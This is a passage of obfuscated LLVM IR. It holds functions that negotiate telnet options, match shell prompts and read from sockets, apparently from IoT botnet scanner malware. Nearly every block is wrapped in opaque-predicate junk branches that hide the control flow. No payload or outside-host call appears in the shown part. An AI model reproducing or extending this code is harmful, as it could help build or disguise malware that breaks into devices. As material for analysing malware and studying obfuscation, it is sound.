  %61 = load i32, i32* %60, align 4
  %62 = load i32*, i32** %3, align 8
  %63 = load i32, i32* %4, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %56
  %67 = load i32, i32* @x.43
  %68 = load i32, i32* @y.44
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %66
  %75 = load i32, i32* %4, align 4
  %76 = add i32 %75, 1
  store i32 %76, i32* %4, align 4
  %77 = load i32, i32* @x.43
  %78 = load i32, i32* @y.44
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart242, label %originalBB32alteredBB

originalBBpart242:                                ; preds = %originalBB32
  br label %34

; <label>:85:                                     ; preds = %originalBBpart230
  %86 = load i32, i32* %2, align 4
  %87 = load i32*, i32** %3, align 8
  %88 = load i64, i64* @numpids, align 8
  %89 = sub i64 %88, 1
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  store i32 %86, i32* %90, align 4
  %91 = load i32*, i32** @pids, align 8
  %92 = bitcast i32* %91 to i8*
  call void @free(i8* %92) #2
  %93 = load i32*, i32** %3, align 8
  store i32* %93, i32** @pids, align 8
  %94 = load i32, i32* %2, align 4
  store i32 %94, i32* %1, align 4
  br label %95

; <label>:95:                                     ; preds = %85, %8
  %96 = load i32, i32* %1, align 4
  ret i32 %96

originalBBalteredBB:                              ; preds = %originalBB, %10
  %97 = load i64, i64* @numpids, align 8
  %_ = sub i64 %97, 1
  %gen = mul i64 %_, 1
  %_1 = sub i64 %97, 1
  %gen2 = mul i64 %_1, 1
  %_3 = shl i64 %97, 1
  %_4 = sub i64 %97, 1
  %gen5 = mul i64 %_4, 1
  %_6 = sub i64 0, %97
  %gen7 = add i64 %_6, 1
  %98 = add i64 %97, 1
  store i64 %98, i64* @numpids, align 8
  %99 = load i64, i64* @numpids, align 8
  %_8 = sub i64 %99, 1
  %gen9 = mul i64 %_8, 1
  %_10 = sub i64 %99, 1
  %gen11 = mul i64 %_10, 1
  %_12 = shl i64 %99, 1
  %_13 = shl i64 %99, 1
  %100 = add i64 %99, 1
  %_14 = shl i64 %100, 4
  %_15 = sub i64 %100, 4
  %gen16 = mul i64 %_15, 4
  %101 = mul i64 %100, 4
  %102 = call noalias i8* @malloc(i64 %101) #2
  %103 = bitcast i8* %102 to i32*
  store i32* %103, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB17alteredBB:                            ; preds = %originalBB17, %34
  %104 = load i32, i32* %4, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %_18 = shl i64 %106, 1
  %_19 = sub i64 %106, 1
  %gen20 = mul i64 %_19, 1
  %_21 = sub i64 %106, 1
  %gen22 = mul i64 %_21, 1
  %_23 = sub i64 0, %106
  %gen24 = add i64 %_23, 1
  %_25 = sub i64 %106, 1
  %gen26 = mul i64 %_25, 1
  %_27 = sub i64 %106, 1
  %gen28 = mul i64 %_27, 1
  %107 = sub i64 %106, 1
  %108 = icmp ult i64 %105, %107
  br label %originalBB17

originalBB32alteredBB:                            ; preds = %originalBB32, %66
  %109 = load i32, i32* %4, align 4
  %_33 = sub i32 0, %109
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %109, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %109, 1
  %_38 = shl i32 %109, 1
  %_39 = sub i32 %109, 1
  %gen40 = mul i32 %_39, 1
  %110 = add i32 %109, 1
  store i32 %110, i32* %4, align 4
  br label %originalBB32
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.45
  %5 = load i32, i32* @y.46
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.45
  %22 = load i32, i32* @y.46
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %173 [
    i32 255, label %29
    i32 251, label %46
    i32 252, label %46
    i32 253, label %46
    i32 254, label %46
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.45
  %31 = load i32, i32* @y.46
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 0, i32* %12, align 4
  %38 = load i32, i32* @x.45
  %39 = load i32, i32* @y.46
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %175

; <label>:46:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  %47 = load i32, i32* @x.45
  %48 = load i32, i32* @y.46
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  store i8 -1, i8* %16, align 1
  %55 = load i32, i32* %13, align 4
  %56 = call i64 @send(i32 %55, i8* %16, i64 1, i32 16384)
  %57 = load i8*, i8** %14, align 8
  %58 = getelementptr inbounds i8, i8* %57, i64 1
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 252, %60
  %62 = load i32, i32* @x.45
  %63 = load i32, i32* @y.46
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %61, label %70, label %71

; <label>:70:                                     ; preds = %originalBBpart28
  store i8 -2, i8* %16, align 1
  br label %150

; <label>:71:                                     ; preds = %originalBBpart28
  %72 = load i32, i32* @x.45
  %73 = load i32, i32* @y.46
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %71
  %80 = load i8*, i8** %14, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 254, %83
  %85 = load i32, i32* @x.45
  %86 = load i32, i32* @y.46
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %84, label %93, label %110

; <label>:93:                                     ; preds = %originalBBpart212
  %94 = load i32, i32* @x.45
  %95 = load i32, i32* @y.46
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %93
  store i8 -4, i8* %16, align 1
  %102 = load i32, i32* @x.45
  %103 = load i32, i32* @y.46
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %149

; <label>:110:                                    ; preds = %originalBBpart212
  %111 = load i32, i32* @x.45
  %112 = load i32, i32* @y.46
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %110
  %119 = load i8*, i8** %14, align 8
  %120 = getelementptr inbounds i8, i8* %119, i64 1
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 3, %122
  %124 = load i32, i32* @x.45
  %125 = load i32, i32* @y.46
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %123, label %132, label %140

; <label>:132:                                    ; preds = %originalBBpart220
  %133 = load i8*, i8** %14, align 8
  %134 = getelementptr inbounds i8, i8* %133, i64 1
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 253
  %138 = select i1 %137, i32 251, i32 253
  %139 = trunc i32 %138 to i8
  store i8 %139, i8* %16, align 1
  br label %148

; <label>:140:                                    ; preds = %originalBBpart220
  %141 = load i8*, i8** %14, align 8
  %142 = getelementptr inbounds i8, i8* %141, i64 1
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 253
  %146 = select i1 %145, i32 252, i32 254
  %147 = trunc i32 %146 to i8
  store i8 %147, i8* %16, align 1
  br label %148

; <label>:148:                                    ; preds = %140, %132
  br label %149

; <label>:149:                                    ; preds = %148, %originalBBpart216
  br label %150

; <label>:150:                                    ; preds = %149, %70
  %151 = load i32, i32* @x.45
  %152 = load i32, i32* @y.46
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %150
  %159 = load i32, i32* %13, align 4
  %160 = call i64 @send(i32 %159, i8* %16, i64 1, i32 16384)
  %161 = load i32, i32* %13, align 4
  %162 = load i8*, i8** %14, align 8
  %163 = getelementptr inbounds i8, i8* %162, i64 2
  %164 = call i64 @send(i32 %161, i8* %163, i64 1, i32 16384)
  %165 = load i32, i32* @x.45
  %166 = load i32, i32* @y.46
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %174

; <label>:173:                                    ; preds = %originalBBpart2
  br label %174

; <label>:174:                                    ; preds = %173, %originalBBpart224
  store i32 0, i32* %12, align 4
  br label %175

; <label>:175:                                    ; preds = %174, %originalBBpart24
  %176 = load i32, i32* %12, align 4
  ret i32 %176

originalBBalteredBB:                              ; preds = %originalBB, %3
  %177 = alloca i32, align 4
  %178 = alloca i32, align 4
  %179 = alloca i8*, align 8
  %180 = alloca i32, align 4
  %181 = alloca i8, align 1
  store i32 %0, i32* %178, align 4
  store i8* %1, i8** %179, align 8
  store i32 %2, i32* %180, align 4
  %182 = load i8*, i8** %179, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  store i8 -1, i8* %16, align 1
  %186 = load i32, i32* %13, align 4
  %187 = call i64 @send(i32 %186, i8* %16, i64 1, i32 16384)
  %188 = load i8*, i8** %14, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 1
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 252, %191
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %71
  %193 = load i8*, i8** %14, align 8
  %194 = getelementptr inbounds i8, i8* %193, i64 1
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 254, %196
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %93
  store i8 -4, i8* %16, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %110
  %198 = load i8*, i8** %14, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 3, %201
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %150
  %203 = load i32, i32* %13, align 4
  %204 = call i64 @send(i32 %203, i8* %16, i64 1, i32 16384)
  %205 = load i32, i32* %13, align 4
  %206 = load i8*, i8** %14, align 8
  %207 = getelementptr inbounds i8, i8* %206, i64 2
  %208 = call i64 @send(i32 %205, i8* %207, i64 1, i32 16384)
  br label %originalBB22
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart236, %1
  %12 = load i32, i32* @x.47
  %13 = load i32, i32* @y.48
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.47
  %26 = load i32, i32* @y.48
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %212

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.47
  %35 = load i32, i32* @y.48
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* @x.47
  %43 = load i32, i32* @y.48
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart222, %originalBBpart24
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %7, align 4
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %120

; <label>:54:                                     ; preds = %50
  %55 = load i8*, i8** %3, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %118, label %66

; <label>:66:                                     ; preds = %54
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %118, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i8*, i8** %3, align 8
  %80 = load i32, i32* %5, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i32, i32* %7, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, %84
  %86 = getelementptr inbounds i8, i8* %82, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = icmp eq i32 %88, 13
  br i1 %89, label %118, label %90

; <label>:90:                                     ; preds = %78
  %91 = load i32, i32* @x.47
  %92 = load i32, i32* @y.48
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i8*, i8** %3, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i32, i32* %7, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = load i32, i32* @x.47
  %111 = load i32, i32* @y.48
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %118

; <label>:118:                                    ; preds = %originalBBpart214, %78, %66, %54
  %119 = phi i1 [ true, %78 ], [ true, %66 ], [ true, %54 ], [ %109, %originalBBpart214 ]
  br label %120

; <label>:120:                                    ; preds = %118, %50
  %121 = phi i1 [ false, %50 ], [ %119, %118 ]
  br i1 %121, label %122, label %141

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* @x.47
  %124 = load i32, i32* @y.48
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %122
  %131 = load i32, i32* %7, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %7, align 4
  %133 = load i32, i32* @x.47
  %134 = load i32, i32* @y.48
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart222, label %originalBB16alteredBB

originalBBpart222:                                ; preds = %originalBB16
  br label %50

; <label>:141:                                    ; preds = %120
  %142 = load i32, i32* @x.47
  %143 = load i32, i32* @y.48
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %141
  %150 = load i8*, i8** %3, align 8
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  %154 = load i32, i32* %7, align 4
  %155 = sext i32 %154 to i64
  %156 = sub i64 0, %155
  %157 = getelementptr inbounds i8, i8* %153, i64 %156
  %158 = load i8, i8* %157, align 1
  %159 = sext i8 %158 to i32
  %160 = load i8*, i8** %4, align 8
  %161 = load i32, i32* %6, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %166 = icmp eq i32 %159, %165
  %167 = load i32, i32* @x.47
  %168 = load i32, i32* @y.48
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart228, label %originalBB24alteredBB

originalBBpart228:                                ; preds = %originalBB24
  br i1 %166, label %175, label %176

; <label>:175:                                    ; preds = %originalBBpart228
  store i32 1, i32* %2, align 4
  br label %213

; <label>:176:                                    ; preds = %originalBBpart228
  %177 = load i32, i32* @x.47
  %178 = load i32, i32* @y.48
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %176
  %185 = load i32, i32* @x.47
  %186 = load i32, i32* @y.48
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %193

; <label>:193:                                    ; preds = %originalBBpart232
  %194 = load i32, i32* @x.47
  %195 = load i32, i32* @y.48
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %193
  %202 = load i32, i32* %6, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %6, align 4
  %204 = load i32, i32* @x.47
  %205 = load i32, i32* @y.48
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %11

; <label>:212:                                    ; preds = %originalBBpart2
  store i32 0, i32* %2, align 4
  br label %213

; <label>:213:                                    ; preds = %212, %175
  %214 = load i32, i32* @x.47
  %215 = load i32, i32* @y.48
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %213
  %222 = load i32, i32* %2, align 4
  %223 = load i32, i32* @x.47
  %224 = load i32, i32* @y.48
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret i32 %222

originalBBalteredBB:                              ; preds = %originalBB, %11
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %233 = load i8*, i8** %4, align 8
  %234 = call i64 @strlen(i8* %233) #10
  %235 = icmp ult i64 %232, %234
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %236 = load i8*, i8** %3, align 8
  %237 = load i32, i32* %5, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds i8, i8* %236, i64 %238
  %240 = load i32, i32* %7, align 4
  %241 = sext i32 %240 to i64
  %_ = shl i64 0, %241
  %_7 = sub i64 0, 0
  %gen = add i64 %_7, %241
  %_8 = shl i64 0, %241
  %_9 = shl i64 0, %241
  %_10 = shl i64 0, %241
  %_11 = sub i64 0, 0
  %gen12 = add i64 %_11, %241
  %242 = sub i64 0, %241
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = sext i8 %244 to i32
  %246 = icmp eq i32 %245, 10
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %122
  %247 = load i32, i32* %7, align 4
  %_17 = sub i32 0, %247
  %gen18 = add i32 %_17, 1
  %_19 = sub i32 0, %247
  %gen20 = add i32 %_19, 1
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %7, align 4
  br label %originalBB16

originalBB24alteredBB:                            ; preds = %originalBB24, %141
  %249 = load i8*, i8** %3, align 8
  %250 = load i32, i32* %5, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8, i8* %249, i64 %251
  %253 = load i32, i32* %7, align 4
  %254 = sext i32 %253 to i64
  %_25 = sub i64 0, %254
  %gen26 = mul i64 %_25, %254
  %255 = sub i64 0, %254
  %256 = getelementptr inbounds i8, i8* %252, i64 %255
  %257 = load i8, i8* %256, align 1
  %258 = sext i8 %257 to i32
  %259 = load i8*, i8** %4, align 8
  %260 = load i32, i32* %6, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds i8, i8* %259, i64 %261
  %263 = load i8, i8* %262, align 1
  %264 = sext i8 %263 to i32
  %265 = icmp eq i32 %258, %264
  br label %originalBB24

originalBB30alteredBB:                            ; preds = %originalBB30, %176
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %193
  %266 = load i32, i32* %6, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %6, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %213
  %268 = load i32, i32* %2, align 4
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
